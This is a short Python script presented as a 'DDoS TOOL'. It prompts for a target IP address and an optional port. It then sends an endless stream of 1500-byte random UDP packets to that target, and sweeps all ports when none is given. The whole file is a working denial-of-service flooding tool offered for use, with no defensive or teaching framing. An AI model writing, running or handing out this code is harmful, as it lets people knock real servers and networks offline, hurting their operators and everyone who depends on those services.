import socket
import random
import pyfiglet


def ddos_attack(ip, port = None):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1500)
    sent = 0
    if port is None:
        port = 1
        while True:
            sock.sendto(bytes, (ip, port))
            port += 1
            sent += 1
            print("[+] Sent %s packet To %s to port : %s"%(sent, ip, port))
            if port == 65535:
                port = 1
    else:
        while True:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print("[+] Sent %s packet To %s to port : %s"%(sent, ip, port))


try:
    result = pyfiglet.figlet_format("DDoS TOOL", font="slant")
    print(result)
    print("\nYou can leave the port number empty, but it is recommended to give a port number.")
    ip = input("Target IP >> ")
    port = input("Port      >> ")
    # Convert port to integer if it's not empty
    if port != "":
        port = int(port)
        ddos_attack(ip, port)
    else:
        ddos_attack(ip)
except (Exception, KeyboardInterrupt, InterruptedError, OSError) as e:
    print("[-] Error : ", e)
    print("-----DDOs Attack Stopped------")
except Exception as e:
    print("[-] Error : ", e)
    print("-----DDOs Attack Stopped------")